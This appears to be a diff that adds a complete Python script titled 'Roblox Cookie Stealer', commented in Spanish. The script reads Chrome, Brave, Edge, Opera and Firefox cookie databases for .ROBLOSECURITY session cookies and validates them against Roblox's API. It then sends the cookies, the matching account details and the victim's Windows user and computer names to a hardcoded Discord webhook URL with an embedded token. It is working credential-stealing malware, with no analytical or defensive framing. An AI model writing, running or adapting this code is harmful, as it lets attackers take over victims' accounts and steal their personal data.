@@ -1,0 +1,344 @@
+#!/usr/bin/env python3
+"""
+ROBLOX COOKIE STEALER - Optimizado
+===================================
+Busca cookies .ROBLOSECURITY en todos los navegadores
+Envía a Discord webhook
+"""
+
+import os
+import re
+import json
+import sqlite3
+import shutil
+import requests
+import platform
+from pathlib import Path
+from datetime import datetime
+
+# ============================================================================
+# CONFIGURACIÓN
+# ============================================================================
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1450153299297833011/TDyCtdaosIcfK61l2Wh9IRJU7e_hW0PAV1xIAe0zWfKs3qCvM0ruw3x3ZGPWNxoZ4cp7"
+
+# ============================================================================
+# RUTAS DE NAVEGADORES (WINDOWS)
+# ============================================================================
+
+def get_browser_paths():
+    """Rutas donde buscar cookies de Roblox"""
+    localappdata = Path(os.getenv('LOCALAPPDATA', ''))
+    appdata = Path(os.getenv('APPDATA', ''))
+    
+    browsers = {
+        'Chrome': localappdata / "Google" / "Chrome" / "User Data" / "Default",
+        'Chrome_Profile1': localappdata / "Google" / "Chrome" / "User Data" / "Profile 1",
+        'Chrome_Profile2': localappdata / "Google" / "Chrome" / "User Data" / "Profile 2",
+        'Brave': localappdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
+        'Edge': localappdata / "Microsoft" / "Edge" / "User Data" / "Default",
+        'Opera': appdata / "Opera Software" / "Opera Stable",
+        'OperaGX': appdata / "Opera Software" / "Opera GX Stable",
+        'Firefox': appdata / "Mozilla" / "Firefox" / "Profiles",
+    }
+    
+    # Filtrar solo los que existen
+    existing = {}
+    for name, path in browsers.items():
+        if path.exists():
+            existing[name] = path
+    
+    return existing
+
+# ============================================================================
+# EXTRACTOR DE COOKIES
+# ============================================================================
+
+class RobloxCookieExtractor:
+    """Extrae cookies .ROBLOSECURITY de navegadores"""
+    
+    @staticmethod
+    def extract_from_chrome(browser_path, browser_name):
+        """Extrae cookies de Chrome/Brave/Edge/Opera"""
+        cookies_found = []
+        
+        # Ubicación de cookies
+        if browser_name in ['Opera', 'OperaGX']:
+            cookies_db = browser_path / "Cookies"
+        else:
+            # Chrome, Brave, Edge usan Network/Cookies
+            cookies_db = browser_path / "Network" / "Cookies"
+            if not cookies_db.exists():
+                cookies_db = browser_path / "Cookies"
+        
+        if not cookies_db.exists():
+            return cookies_found
+        
+        try:
+            # Copiar DB para no bloquear el navegador
+            temp_db = Path(os.getenv('TEMP')) / f"roblox_cookies_{browser_name}.db"
+            shutil.copy2(cookies_db, temp_db)
+            
+            # Conectar y buscar
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Buscar cookie .ROBLOSECURITY
+            cursor.execute("""
+                SELECT host_key, name, value, expires_utc, encrypted_value 
+                FROM cookies 
+                WHERE host_key LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'
+            """)
+            
+            for row in cursor.fetchall():
+                host, name, value, expires, encrypted = row
+                
+                # Si el valor está en texto plano
+                if value:
+                    cookies_found.append({
+                        'browser': browser_name,
+                        'cookie': value,
+                        'host': host,
+                        'expires': expires,
+                        'encrypted': False
+                    })
+                # Si está encriptado (intentar extraer igual)
+                elif encrypted:
+                    cookies_found.append({
+                        'browser': browser_name,
+                        'cookie': f'[ENCRYPTED] {encrypted[:50].hex()}...',
+                        'host': host,
+                        'expires': expires,
+                        'encrypted': True
+                    })
+            
+            conn.close()
+            temp_db.unlink()
+            
+        except Exception as e:
+            pass
+        
+        return cookies_found
+    
+    @staticmethod
+    def extract_from_firefox(profile_path):
+        """Extrae cookies de Firefox"""
+        cookies_found = []
+        
+        # Firefox usa cookies.sqlite
+        for profile in profile_path.iterdir():
+            if profile.is_dir():
+                cookies_db = profile / "cookies.sqlite"
+                if cookies_db.exists():
+                    try:
+                        temp_db = Path(os.getenv('TEMP')) / f"roblox_firefox_{profile.name}.db"
+                        shutil.copy2(cookies_db, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        cursor.execute("""
+                            SELECT host, name, value, expiry 
+                            FROM moz_cookies 
+                            WHERE host LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'
+                        """)
+                        
+                        for row in cursor.fetchall():
+                            host, name, value, expiry = row
+                            cookies_found.append({
+                                'browser': f'Firefox - {profile.name}',
+                                'cookie': value,
+                                'host': host,
+                                'expires': expiry,
+                                'encrypted': False
+                            })
+                        
+                        conn.close()
+                        temp_db.unlink()
+                    except:
+                        pass
+        
+        return cookies_found
+    
+    @staticmethod
+    def validate_cookie(cookie_value):
+        """Valida si la cookie es válida llamando a Roblox API"""
+        if not cookie_value or '[ENCRYPTED]' in cookie_value:
+            return None
+        
+        try:
+            # Llamar a API de Roblox para verificar
+            headers = {
+                'Cookie': f'.ROBLOSECURITY={cookie_value}'
+            }
+            
+            response = requests.get(
+                'https://users.roblox.com/v1/users/authenticated',
+                headers=headers,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                user_data = response.json()
+                return {
+                    'valid': True,
+                    'username': user_data.get('name', 'Unknown'),
+                    'user_id': user_data.get('id', 'Unknown'),
+                    'display_name': user_data.get('displayName', 'Unknown')
+                }
+            
+            return None
+            
+        except:
+            return None
+
+# ============================================================================
+# ENVÍO A WEBHOOK
+# ============================================================================
+
+def send_to_webhook(cookies_data):
+    """Envía cookies a Discord webhook"""
+    if not cookies_data:
+        return
+    
+    try:
+        # Obtener info del sistema
+        pc_username = os.getenv('USERNAME', 'Unknown')
+        pc_name = os.getenv('COMPUTERNAME', 'Unknown')
+        
+        embeds = []
+        
+        # Crear embed por cada cookie
+        for i, cookie_info in enumerate(cookies_data, 1):
+            # Color según si está validada
+            if cookie_info.get('user_info'):
+                color = 0x00FF00  # Verde si es válida
+                status = "✅ VÁLIDA"
+            elif cookie_info.get('encrypted'):
+                color = 0xFFA500  # Naranja si está encriptada
+                status = "🔒 ENCRIPTADA"
+            else:
+                color = 0xFF0000  # Rojo si no se pudo validar
+                status = "⚠️ NO VALIDADA"
+            
+            fields = [
+                {
+                    'name': '🌐 Navegador',
+                    'value': cookie_info['browser'],
+                    'inline': True
+                },
+                {
+                    'name': '📊 Estado',
+                    'value': status,
+                    'inline': True
+                },
+                {
+                    'name': '🍪 Cookie',
+                    'value': f'||{cookie_info["cookie"][:100]}...||',
+                    'inline': False
+                }
+            ]
+            
+            # Si la cookie es válida, añadir info del usuario
+            if cookie_info.get('user_info'):
+                user = cookie_info['user_info']
+                fields.append({
+                    'name': '👤 Usuario Roblox',
+                    'value': f"**{user['username']}** (ID: {user['user_id']})\nDisplay: {user['display_name']}",
+                    'inline': False
+                })
+            
+            # Info del PC
+            fields.append({
+                'name': '💻 PC Info',
+                'value': f"Usuario: `{pc_username}`\nPC: `{pc_name}`",
+                'inline': False
+            })
+            
+            embed = {
+                'title': f'🎮 Cookie Roblox #{i}',
+                'color': color,
+                'fields': fields,
+                'footer': {
+                    'text': f'Extraído el {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
+                }
+            }
+            
+            embeds.append(embed)
+        
+        # Enviar en lotes de 10 (límite de Discord)
+        for i in range(0, len(embeds), 10):
+            batch = embeds[i:i+10]
+            
+            payload = {
+                'username': 'Roblox Cookie Grabber',
+                'avatar_url': 'https://cdn.discordapp.com/attachments/1234567890/roblox_logo.png',
+                'embeds': batch
+            }
+            
+            requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        
+    except Exception as e:
+        pass
+
+# ============================================================================
+# FUNCIÓN PRINCIPAL
+# ============================================================================
+
+def main():
+    """Escanear todos los navegadores y extraer cookies de Roblox"""
+    
+    print("🔍 Buscando cookies de Roblox...")
+    
+    all_cookies = []
+    extractor = RobloxCookieExtractor()
+    
+    # Obtener rutas de navegadores
+    browsers = get_browser_paths()
+    
+    # Escanear cada navegador
+    for browser_name, browser_path in browsers.items():
+        print(f"  📂 Escaneando {browser_name}...")
+        
+        if 'Firefox' in browser_name:
+            cookies = extractor.extract_from_firefox(browser_path)
+        else:
+            cookies = extractor.extract_from_chrome(browser_path, browser_name)
+        
+        if cookies:
+            print(f"    ✓ Encontradas {len(cookies)} cookies")
+            all_cookies.extend(cookies)
+    
+    # Validar cookies encontradas
+    if all_cookies:
+        print(f"\n✅ Total encontradas: {len(all_cookies)}")
+        print("🔍 Validando cookies...")
+        
+        for cookie_info in all_cookies:
+            if not cookie_info.get('encrypted'):
+                user_info = extractor.validate_cookie(cookie_info['cookie'])
+                if user_info:
+                    cookie_info['user_info'] = user_info
+                    print(f"  ✓ Cookie válida: {user_info['username']}")
+        
+        # Enviar a webhook
+        print("\n📤 Enviando a Discord...")
+        send_to_webhook(all_cookies)
+        print("✅ Completado!")
+    else:
+        print("❌ No se encontraron cookies de Roblox")
+        # Enviar notificación aunque no haya cookies
+        payload = {
+            'content': f'❌ No se encontraron cookies de Roblox en el PC: `{os.getenv("COMPUTERNAME", "Unknown")}`'
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        # Enviar error al webhook
+        payload = {
+            'content': f'❌ Error en PC `{os.getenv("COMPUTERNAME", "Unknown")}`: {str(e)}'
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
